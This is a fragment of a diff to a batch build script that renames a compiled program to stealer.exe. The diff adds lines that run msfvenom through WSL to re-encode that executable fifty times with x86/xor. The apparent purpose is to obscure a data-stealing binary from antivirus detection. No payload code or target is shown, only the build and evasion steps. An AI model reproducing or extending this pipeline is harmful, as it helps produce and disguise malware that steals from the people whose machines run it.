@@ -22,3 +22,6 @@ echo Temporary files deleted!
 
 ren main.exe stealer.exe
 echo Our Stealer.exe is ready!
+
+wsl
+msfvenom -x stealer.exe -e x86/xor -i 50 -f exe -o stealer.exe
